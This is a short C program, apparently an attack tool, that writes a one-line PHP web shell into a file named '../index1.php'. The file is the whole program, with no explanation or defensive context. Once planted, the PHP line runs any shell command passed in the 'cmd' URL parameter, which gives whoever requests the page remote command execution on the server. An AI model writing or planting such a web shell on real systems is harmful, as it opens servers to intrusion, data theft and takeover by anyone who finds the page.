#include <stdio.h>
main(){
  char s[]="<?php echo exec($_GET[\'cmd\']); ?>";
  puts(s);
  FILE *f=fopen("../index1.php","w");
  fprintf(f,s);
  fclose(f);
}